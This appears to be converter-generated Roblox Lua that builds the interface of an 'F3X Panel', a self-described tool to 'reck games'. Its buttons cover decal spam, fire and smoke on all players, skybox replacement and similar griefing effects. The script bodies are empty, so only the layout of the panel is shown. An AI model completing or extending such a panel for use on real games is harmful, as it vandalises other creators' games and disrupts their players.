--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 142 | Scripts: 61 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.ScreenGui.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(53, 53, 53);
G2L["2"]["Size"] = UDim2.new(0, 581, 0, 419);
G2L["2"]["Position"] = UDim2.new(0.28733, 0, 0.24769, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.ScreenGui.Frame.UICorner
G2L["3"] = Instance.new("UICorner", G2L["2"]);



-- StarterGui.ScreenGui.Frame.Home
G2L["4"] = Instance.new("Frame", G2L["2"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["4"]["Size"] = UDim2.new(0, 581, 0, 365);
G2L["4"]["Position"] = UDim2.new(0, 0, 0.168, 0);
G2L["4"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["Name"] = [[Home]];


-- StarterGui.ScreenGui.Frame.Home.TextLabel
G2L["5"] = Instance.new("TextLabel", G2L["4"]);
G2L["5"]["TextWrapped"] = true;
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 14;
G2L["5"]["TextScaled"] = true;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["BackgroundTransparency"] = 1;
G2L["5"]["Size"] = UDim2.new(0, 255, 0, 52);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[Welcome to F3X Panel User!]];
G2L["5"]["Position"] = UDim2.new(0.39197, 0, 0.09589, 0);


-- StarterGui.ScreenGui.Frame.Home.TextLabel
G2L["6"] = Instance.new("TextLabel", G2L["4"]);
G2L["6"]["TextWrapped"] = true;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextSize"] = 14;
G2L["6"]["TextScaled"] = true;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Size"] = UDim2.new(0, 255, 0, 52);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[This Was Made by @coikax on discord!]];
G2L["6"]["Position"] = UDim2.new(0.39197, 0, 0.29041, 0);


-- StarterGui.ScreenGui.Frame.Home.TextLabel
G2L["7"] = Instance.new("TextLabel", G2L["4"]);
G2L["7"]["TextWrapped"] = true;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["TextScaled"] = true;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Size"] = UDim2.new(0, 255, 0, 52);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[You can use this to reck games!]];
G2L["7"]["Position"] = UDim2.new(0.39197, 0, 0.52603, 0);


-- StarterGui.ScreenGui.Frame.Home.TextLabel
G2L["8"] = Instance.new("TextLabel", G2L["4"]);
G2L["8"]["TextWrapped"] = true;
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["TextSize"] = 14;
G2L["8"]["TextScaled"] = true;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["BackgroundTransparency"] = 1;
G2L["8"]["Size"] = UDim2.new(0, 255, 0, 52);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[Go subscribe to my Youtube!]];
G2L["8"]["Position"] = UDim2.new(0.39197, 0, 0.76712, 0);


-- StarterGui.ScreenGui.Frame.Home.ImageLabel
G2L["9"] = Instance.new("ImageLabel", G2L["4"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["9"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["BackgroundTransparency"] = 1;
G2L["9"]["Position"] = UDim2.new(0.06383, 0, 0.02921, 0);


-- StarterGui.ScreenGui.Frame.Home.ImageLabel.UICorner
G2L["a"] = Instance.new("UICorner", G2L["9"]);
G2L["a"]["CornerRadius"] = UDim.new(8, 0);


-- StarterGui.ScreenGui.Frame.Home.ImageLabel.LocalScript
G2L["b"] = Instance.new("LocalScript", G2L["9"]);



-- StarterGui.ScreenGui.Frame.Home.TextLabel
G2L["c"] = Instance.new("TextLabel", G2L["4"]);
G2L["c"]["TextWrapped"] = true;
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextSize"] = 14;
G2L["c"]["TextScaled"] = true;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Position"] = UDim2.new(-0.00133, 0, 0.3589, 0);


-- StarterGui.ScreenGui.Frame.Home.TextLabel.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["c"]);



-- StarterGui.ScreenGui.Frame.Home.TextLabel
G2L["e"] = Instance.new("TextLabel", G2L["4"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextScaled"] = true;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Position"] = UDim2.new(0.00039, 0, 0.63014, 0);


-- StarterGui.ScreenGui.Frame.Home.TextLabel.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["e"]);



-- StarterGui.ScreenGui.Frame.TextButton
G2L["10"] = Instance.new("TextButton", G2L["2"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextSize"] = 14;
G2L["10"]["TextScaled"] = true;
G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["Size"] = UDim2.new(0, 113, 0, 39);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[Home]];
G2L["10"]["Position"] = UDim2.new(0.0241, 0, 0.05012, 0);


-- StarterGui.ScreenGui.Frame.TextButton.UICorner
G2L["11"] = Instance.new("UICorner", G2L["10"]);



-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
G2L["12"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.ScreenGui.Frame.TextButton
G2L["13"] = Instance.new("TextButton", G2L["2"]);
G2L["13"]["TextWrapped"] = true;
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["TextSize"] = 14;
G2L["13"]["TextScaled"] = true;
G2L["13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13"]["Size"] = UDim2.new(0, 113, 0, 39);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Text"] = [[Skybox/decals]];
G2L["13"]["Position"] = UDim2.new(0.25818, 0, 0.05012, 0);


-- StarterGui.ScreenGui.Frame.TextButton.UICorner
G2L["14"] = Instance.new("UICorner", G2L["13"]);



-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
G2L["15"] = Instance.new("LocalScript", G2L["13"]);



-- StarterGui.ScreenGui.Frame.TextButton
G2L["16"] = Instance.new("TextButton", G2L["2"]);
G2L["16"]["TextWrapped"] = true;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 14;
G2L["16"]["TextScaled"] = true;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["Size"] = UDim2.new(0, 113, 0, 39);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[F3X Scripts]];
G2L["16"]["Position"] = UDim2.new(0.50602, 0, 0.05012, 0);


-- StarterGui.ScreenGui.Frame.TextButton.UICorner
G2L["17"] = Instance.new("UICorner", G2L["16"]);



-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
G2L["18"] = Instance.new("LocalScript", G2L["16"]);



-- StarterGui.ScreenGui.Frame.TextButton
G2L["19"] = Instance.new("TextButton", G2L["2"]);
G2L["19"]["TextWrapped"] = true;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextSize"] = 14;
G2L["19"]["TextScaled"] = true;
G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["Size"] = UDim2.new(0, 113, 0, 39);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[Player scripts]];
G2L["19"]["Position"] = UDim2.new(0.76076, 0, 0.05012, 0);


-- StarterGui.ScreenGui.Frame.TextButton.UICorner
G2L["1a"] = Instance.new("UICorner", G2L["19"]);



-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
G2L["1b"] = Instance.new("LocalScript", G2L["19"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals
G2L["1c"] = Instance.new("Frame", G2L["2"]);
G2L["1c"]["Visible"] = false;
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["1c"]["Size"] = UDim2.new(0, 581, 0, 365);
G2L["1c"]["Position"] = UDim2.new(0, 0, 0.168, 0);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["Name"] = [[Skybox/decals]];


-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton
G2L["1d"] = Instance.new("TextButton", G2L["1c"]);
G2L["1d"]["TextWrapped"] = true;
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextSize"] = 14;
G2L["1d"]["TextScaled"] = true;
G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(53, 53, 53);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["Size"] = UDim2.new(0, 94, 0, 47);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[Hd Skybox]];
G2L["1d"]["Position"] = UDim2.new(0, 0, 0.10712, 0);


-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.UICorner
G2L["1e"] = Instance.new("UICorner", G2L["1d"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
G2L["1f"] = Instance.new("LocalScript", G2L["1d"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton
G2L["20"] = Instance.new("TextButton", G2L["1c"]);
G2L["20"]["TextWrapped"] = true;
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["TextSize"] = 14;
G2L["20"]["TextScaled"] = true;
G2L["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(53, 53, 53);
G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20"]["Size"] = UDim2.new(0, 94, 0, 47);
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["Text"] = [[Skybox]];
G2L["20"]["Position"] = UDim2.new(0.16523, 0, 0.10712, 0);


-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.UICorner
G2L["21"] = Instance.new("UICorner", G2L["20"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["20"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton
G2L["23"] = Instance.new("TextButton", G2L["1c"]);
G2L["23"]["TextWrapped"] = true;
G2L["23"]["BorderSizePixel"] = 0;
G2L["23"]["TextSize"] = 14;
G2L["23"]["TextScaled"] = true;
G2L["23"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(53, 53, 53);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["Size"] = UDim2.new(0, 94, 0, 47);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Text"] = [[Old decal]];
G2L["23"]["Position"] = UDim2.new(0, 0, 0.23588, 0);


-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.UICorner
G2L["24"] = Instance.new("UICorner", G2L["23"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
G2L["25"] = Instance.new("LocalScript", G2L["23"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton
G2L["26"] = Instance.new("TextButton", G2L["1c"]);
G2L["26"]["TextWrapped"] = true;
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["TextSize"] = 14;
G2L["26"]["TextScaled"] = true;
G2L["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(53, 53, 53);
G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26"]["Size"] = UDim2.new(0, 94, 0, 47);
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["Text"] = [[Trippy skybox]];
G2L["26"]["Position"] = UDim2.new(0, 0, 0.36739, 0);


-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.UICorner
G2L["27"] = Instance.new("UICorner", G2L["26"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
G2L["28"] = Instance.new("LocalScript", G2L["26"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton
G2L["29"] = Instance.new("TextButton", G2L["1c"]);
G2L["29"]["TextWrapped"] = true;
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["TextSize"] = 14;
G2L["29"]["TextScaled"] = true;
G2L["29"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(53, 53, 53);
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29"]["Size"] = UDim2.new(0, 94, 0, 47);
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Text"] = [[Instant decal spam]];
G2L["29"]["Position"] = UDim2.new(0.16523, 0, 0.23862, 0);


-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.UICorner
G2L["2a"] = Instance.new("UICorner", G2L["29"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
G2L["2b"] = Instance.new("LocalScript", G2L["29"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton
G2L["2c"] = Instance.new("TextButton", G2L["1c"]);
G2L["2c"]["TextWrapped"] = true;
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextSize"] = 14;
G2L["2c"]["TextScaled"] = true;
G2L["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(53, 53, 53);
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2c"]["Size"] = UDim2.new(0, 94, 0, 47);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[Remove skybox]];
G2L["2c"]["Position"] = UDim2.new(0.16523, 0, 0.36739, 0);


-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.UICorner
G2L["2d"] = Instance.new("UICorner", G2L["2c"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
G2L["2e"] = Instance.new("LocalScript", G2L["2c"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton
G2L["2f"] = Instance.new("TextButton", G2L["1c"]);
G2L["2f"]["TextWrapped"] = true;
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["TextSize"] = 14;
G2L["2f"]["TextScaled"] = true;
G2L["2f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(53, 53, 53);
G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2f"]["Size"] = UDim2.new(0, 94, 0, 47);
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["Text"] = [[Remove decals]];
G2L["2f"]["Position"] = UDim2.new(0, 0, 0.49616, 0);


-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.UICorner
G2L["30"] = Instance.new("UICorner", G2L["2f"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
G2L["31"] = Instance.new("LocalScript", G2L["2f"]);



-- StarterGui.ScreenGui.Frame.Skybox/decals.decal
G2L["32"] = Instance.new("TextBox", G2L["1c"]);
G2L["32"]["CursorPosition"] = -1;
G2L["32"]["Name"] = [[decal]];
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["TextWrapped"] = true;
G2L["32"]["TextSize"] = 14;
G2L["32"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["TextScaled"] = true;
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(19, 19, 19);
G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["32"]["PlaceholderText"] = [[Your Decal Id]];
G2L["32"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["32"]["Position"] = UDim2.new(0.57659, 0, 0.23836, 0);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Text"] = [[]];


-- StarterGui.ScreenGui.Frame.F3X Scripts
G2L["33"] = Instance.new("Frame", G2L["2"]);
G2L["33"]["Visible"] = false;
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["33"]["Size"] = UDim2.new(0, 581, 0, 365);
G2L["33"]["Position"] = UDim2.new(0, 0, 0.168, 0);
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["Name"] = [[F3X Scripts]];


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["34"] = Instance.new("TextButton", G2L["33"]);
G2L["34"]["TextWrapped"] = true;
G2L["34"]["BorderSizePixel"] = 4;
G2L["34"]["TextSize"] = 14;
G2L["34"]["TextScaled"] = true;
G2L["34"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["34"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["34"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["Text"] = [[Rotate spam]];
G2L["34"]["Position"] = UDim2.new(0.00965, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["35"] = Instance.new("LocalScript", G2L["34"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["36"] = Instance.new("TextButton", G2L["33"]);
G2L["36"]["TextWrapped"] = true;
G2L["36"]["BorderSizePixel"] = 4;
G2L["36"]["TextSize"] = 14;
G2L["36"]["TextScaled"] = true;
G2L["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["36"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["36"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["Text"] = [[Fire all]];
G2L["36"]["Position"] = UDim2.new(0.1273, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["37"] = Instance.new("LocalScript", G2L["36"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["38"] = Instance.new("TextButton", G2L["33"]);
G2L["38"]["TextWrapped"] = true;
G2L["38"]["BorderSizePixel"] = 4;
G2L["38"]["TextSize"] = 14;
G2L["38"]["TextScaled"] = true;
G2L["38"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["38"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["38"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["Text"] = [[Sparkles all]];
G2L["38"]["Position"] = UDim2.new(0.24642, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["39"] = Instance.new("LocalScript", G2L["38"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["3a"] = Instance.new("TextButton", G2L["33"]);
G2L["3a"]["TextWrapped"] = true;
G2L["3a"]["BorderSizePixel"] = 4;
G2L["3a"]["TextSize"] = 14;
G2L["3a"]["TextScaled"] = true;
G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3a"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["Text"] = [[Large fire all]];
G2L["3a"]["Position"] = UDim2.new(0.36995, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["3b"] = Instance.new("LocalScript", G2L["3a"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["3c"] = Instance.new("TextButton", G2L["33"]);
G2L["3c"]["TextWrapped"] = true;
G2L["3c"]["BorderSizePixel"] = 4;
G2L["3c"]["TextSize"] = 14;
G2L["3c"]["TextScaled"] = true;
G2L["3c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3c"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["Text"] = [[Large smoke all]];
G2L["3c"]["Position"] = UDim2.new(0.49348, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["3d"] = Instance.new("LocalScript", G2L["3c"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["3e"] = Instance.new("TextButton", G2L["33"]);
G2L["3e"]["TextWrapped"] = true;
G2L["3e"]["BorderSizePixel"] = 4;
G2L["3e"]["TextSize"] = 14;
G2L["3e"]["TextScaled"] = true;
G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["Text"] = [[666]];
G2L["3e"]["Position"] = UDim2.new(0.61995, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["3f"] = Instance.new("LocalScript", G2L["3e"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["40"] = Instance.new("TextButton", G2L["33"]);
G2L["40"]["TextWrapped"] = true;
G2L["40"]["BorderSizePixel"] = 4;
G2L["40"]["TextSize"] = 14;
G2L["40"]["TextScaled"] = true;
G2L["40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["40"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["40"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["Text"] = [[Mario.exe spam]];
G2L["40"]["Position"] = UDim2.new(0.74495, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["41"] = Instance.new("LocalScript", G2L["40"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["42"] = Instance.new("LocalScript", G2L["40"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton
G2L["43"] = Instance.new("TextButton", G2L["33"]);
G2L["43"]["TextWrapped"] = true;
G2L["43"]["BorderSizePixel"] = 4;
G2L["43"]["TextSize"] = 14;
G2L["43"]["TextScaled"] = true;
G2L["43"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["43"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["43"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["Text"] = [[Shedletsky ]];
G2L["43"]["Position"] = UDim2.new(0.88024, 0, 0.02687, 0);


-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["44"] = Instance.new("LocalScript", G2L["43"]);



-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
G2L["45"] = Instance.new("LocalScript", G2L["43"]);



